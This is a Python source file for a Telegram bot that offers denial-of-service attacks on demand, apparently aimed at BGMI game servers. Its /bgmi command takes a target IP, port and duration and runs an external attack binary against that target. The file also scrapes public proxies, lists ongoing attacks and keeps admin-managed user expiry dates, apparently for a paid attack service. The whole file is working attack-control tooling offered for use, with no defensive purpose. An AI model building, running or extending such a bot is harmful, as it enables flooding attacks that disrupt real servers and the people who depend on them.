import logging
import subprocess
import asyncio
import itertools
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, GROUP_ID, GROUP_LINK, DEFAULT_THREADS

# Proxy-related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'
proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        logging.error(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
        if proxy_iterator is None:  # If proxies are not available
            return None
    return next(proxy_iterator, None)

# Global variables
user_processes = {}
active_attack = False  # Track if an attack is in progress
MAX_DURATION = 240  # Max attack duration in seconds

# Ensure commands are executed in the correct group
async def ensure_correct_group(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if update.effective_chat.id != GROUP_ID:
        await update.message.reply_text(f"❌ This bot can only be used in a specific group. Join here: {GROUP_LINK}")
        return False
    return True

# Function to handle the attack in a separate async task
async def start_attack(target_ip, port, duration, user_id, original_message, context):
    global active_attack
    command = ['./xxxx', target_ip, str(port), str(duration)]

    try:
        process = await asyncio.create_subprocess_exec(*command)
        user_processes[user_id] = {
            "process": process,
            "target_ip": target_ip,
            "port": port,
            "duration": duration
        }

        # Wait for the attack to finish
        await asyncio.wait_for(process.wait(), timeout=duration)

        # After the attack finishes, remove the process from the dictionary
        del user_processes[user_id]
        active_attack = False  # Reset the flag after the attack finishes

        # Reply to the original message with the attack finish status
        await original_message.reply_text(f"✅ Attack finished on {target_ip}:{port} for {duration} seconds.\n\n                      ⚠️‼️ 𝚂𝚎𝚗𝚍 𝙵𝚎𝚎𝚍𝚋𝚊𝚌𝚔𝚜 ‼️⚠️ ")
        logging.info(f"Attack finished on {target_ip}:{port} by user {user_id}")

    except asyncio.TimeoutError:
        # Handle the case where the attack takes longer than expected
        await process.terminate()
        del user_processes[user_id]
        active_attack = False  # Reset the flag
        await original_message.reply_text("⚠️ Attack terminated as it exceeded the duration.")
        logging.warning(f"Attack timeout on {target_ip}:{port} for user {user_id}")

    except Exception as e:
        logging.error(f"Error starting attack: {str(e)}")
        if user_id in user_processes:
            del user_processes[user_id]
        active_attack = False  # Reset the flag in case of an error
        await context.bot.send_message(chat_id=user_id, text="❌ There was an error with the attack.")


# Start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    await update.message.reply_text("👋 Welcome to the Attack Bot!\nUse /bgmi <IP> <PORT> <DURATION> to start an attack.")

# BGMI command handler
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global active_attack
    if not await ensure_correct_group(update, context):
        return
    
    user_id = update.message.from_user.id

    # Check if there is an active attack
    if active_attack:
        await update.message.reply_text("🚫 An attack is already in progress. Please wait for the current attack to finish before starting a new one.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("🛡️ Usage: /bgmi <target_ip> <port> <duration>")
        return

    target_ip = context.args[0]
    try:
        port = int(context.args[1])
        duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text("⚠️ Port and duration must be integers.")
        return

    # Enforce maximum duration
    if duration > MAX_DURATION:
        await update.message.reply_text(f"⚠️ Maximum attack duration is {MAX_DURATION} seconds. The duration has been set to {MAX_DURATION} seconds.")
        duration = MAX_DURATION

    # Inform the user that the attack is starting
    attack_message = await update.message.reply_text(f"🚀 Attack started on {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.\n\n                      ⚠️‼️ 𝚂𝚎𝚗𝚍 𝙵𝚎𝚎𝚍𝚋𝚊𝚌𝚔𝚜 ‼️⚠️ ")
      
    # Set the active attack flag
    active_attack = True

    # Start the attack asynchronously in the background
    asyncio.create_task(start_attack(target_ip, port, duration, user_id, attack_message, context))

# View attacks command
async def view_attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    if not user_processes:
        await update.message.reply_text("📊 No ongoing attacks.")
        return
    attack_details = "\n".join([f"User: {user_id}, Target: {details['target_ip']}:{details['port']}"
                                 for user_id, details in user_processes.items()])
    await update.message.reply_text(f"📊 Ongoing attacks:\n{attack_details}")

# Help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    help_text = """
ℹ️ **Help Menu**:
- /start - Start the bot
- /bgmi <IP> <PORT> <DURATION> - Start a new attack
- /view_attacks - View ongoing attacks
- /help - Display this help message
"""
    await update.message.reply_text(help_text)

# All users command (Admin-only)
async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    user_id = str(update.message.from_user.id)
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    users = {"123456789": "2024-12-31", "987654321": "2025-01-31"}
    user_list = "\n".join([f"User ID: {uid}, Expiry: {exp}" for uid, exp in users.items()])
    await update.message.reply_text(f"👥 Authorized users:\n{user_list}")

# Main application setup
if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("view_attacks", view_attacks))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("allusers", allusers))
    app.run_polling()
